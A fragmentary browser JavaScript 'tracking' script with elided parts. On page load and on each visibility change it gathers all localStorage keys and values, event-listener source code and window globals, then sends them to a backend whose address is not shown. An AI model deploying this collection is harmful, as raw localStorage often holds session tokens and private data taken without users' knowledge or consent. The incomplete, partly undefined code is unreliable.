function trackLocalStorageBehaviour() {
  const localStorageFindings = {};
  for (const key in localStorage) {
    const value = localStorage.getItem(key);
    const type = typeof value;
    localStorageFindings[key] = {
      type: type,
      value: value
    };
  }
  return localStorageFindings;
}
function trackEventListeners() {
  ...
  ['click', 'mousedown', 'mouseup', 'mousemove'].forEach(type => {
    if (eventListeners[type]) {
      trackedData[type] = eventListeners[type].map(listener => {
        const funcCode = listener.listener.toString();
        const anonymized = funcCode.replace(/\/\/.*$|\/\*[\s\S]*?\*\/|(['"]).*?\1/gm, '');
        const count = (anonymized.match(new RegExp(';', 'g')) || []).length;
        return {
          useCapture: listener.useCapture,
          phase: listener.phase,
          code: anonymized,
          statementCounts: count
        };
      });
    }
  });
...
function collectGlobalVariables() {
  ...
  propNames.forEach(propName => {
    if (window.hasOwnProperty(propName) && !window.seenVars.includes(propName)) {
      findings[propName] = typeof window[propName];
    }
  });
  return findings;
}
async function sendTrackedDataToBackend(trackedData) {
  ...
  try {
    ...
    if (response.ok) {
      console.log("Tracked data has been successfully sent to the backend.");
    } else {
      console.warn(`Failed to send tracked data, server responded with status: ${response.status}`);
    }
  } catch (error) {
    console.error("Error occurred during sending tracked data:", error);
  }
}
...
function performTrackingTask() {
  const localStorageFindings = trackLocalStorageBehaviour();
  const globalFindings = collectGlobalVariables();
  const trackedEventListeners = trackEventListeners();
  const trackedData = {
    localStorage: localStorageFindings,
    globals: globalFindings,
    eventListeners: trackedEventListeners
  };
  sendTrackedDataToBackend(trackedData);
}
window.addEventListener("load", performTrackingTask);
;
...
document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "visible") {
    console.log("Visibility has changed, re-executing tracking task...");
    performTrackingTask();
  }
});